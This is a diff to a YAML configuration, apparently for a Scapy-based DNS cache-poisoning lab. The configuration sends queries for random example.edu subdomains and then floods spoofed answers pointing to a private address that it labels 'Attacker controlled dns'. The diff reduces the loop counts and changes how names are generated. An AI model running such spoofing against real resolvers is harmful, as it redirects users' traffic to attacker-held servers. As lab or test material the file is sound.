@@ -1,6 +1,6 @@
 loop:
-    count: 1000
-    variable: "python:str(__import__('random').randint(0, 0xff000)) + '.example.edu'" # Set this to be the variable...
+    count: 10
+    variable: "python:''.join(__import__('random').choices(__import__('string').ascii_uppercase, k = 5)) + '.example.edu'" # Set this to be the variable...
     method:
         send:
             packets: # Scapy calls this 'x'
@@ -18,7 +18,7 @@ loop:
                                 qclass: "IN" # IN
             iface: "eth0"
         loop:
-            count: 50
+            count: 5
             method:
                 send:
                     packets: # Scapy calls this 'x'
@@ -57,5 +57,6 @@ loop:
                                         ttl: 86400
                                         rdata: "172.22.0.5" # Attacker controlled dns
                     iface: "eth0"
+
 
 
